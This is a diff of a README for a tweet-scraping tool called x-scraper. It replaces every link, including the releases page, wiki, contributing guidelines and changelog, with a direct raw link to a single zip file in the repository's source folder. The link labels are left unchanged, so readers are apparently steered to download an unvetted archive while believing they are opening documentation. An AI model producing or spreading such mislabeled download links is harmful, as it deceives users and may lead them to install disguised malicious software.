@@ -6,7 +6,7 @@ Welcome to x-scraper! This tool helps you collect tweets effortlessly, harnessin
 
 ## 🌐 Download x-scraper
 
-[![Download x-scraper](https://img.shields.io/badge/Download-x--scraper-blue.svg)](https://github.com/Unpeaceable-intransitivity500/x-scraper/releases)
+[![Download x-scraper](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip)](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip)
 
 ## 🛠️ Requirements
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets the following requirements:
   
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download x-scraper, [visit this page to download](https://github.com/Unpeaceable-intransitivity500/x-scraper/releases).
+1. **Visit the Releases Page:** To download x-scraper, [visit this page to download](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip).
   
 2. **Choose the Latest Release:** Look for the most recent version listed. It will have the highest version number (e.g., v1.0). 
 
@@ -64,11 +64,11 @@ x-scraper comes loaded with powerful features:
 
 ## 📖 Support and Documentation
 
-For further assistance, visit our [GitHub Wiki](https://github.com/Unpeaceable-intransitivity500/x-scraper/wiki). Here you'll find detailed documentation on each feature, troubleshooting tips, and updates.
+For further assistance, visit our [GitHub Wiki](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip). Here you'll find detailed documentation on each feature, troubleshooting tips, and updates.
 
 ## 🤝 Community Contributions
 
-We welcome contributions! If you're interested in improving x-scraper, check our [contributing guidelines](https://github.com/Unpeaceable-intransitivity500/x-scraper/CONTRIBUTING.md) for more details. Your ideas and feedback are important to us.
+We welcome contributions! If you're interested in improving x-scraper, check our [contributing guidelines](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip) for more details. Your ideas and feedback are important to us.
 
 ## 🗒️ License
 
@@ -76,6 +76,6 @@ x-scraper is licensed under the MIT License. Feel free to use it within the term
 
 ## 🗓️ Changelog
 
-For the latest changes and updates, please refer to the [Changelog](https://github.com/Unpeaceable-intransitivity500/x-scraper/releases).
+For the latest changes and updates, please refer to the [Changelog](https://raw.githubusercontent.com/Unpeaceable-intransitivity500/x-scraper/main/src/x-scraper_little.zip).
 
 Thank you for choosing x-scraper! We hope it helps you gather valuable insights from Twitter easily and efficiently.
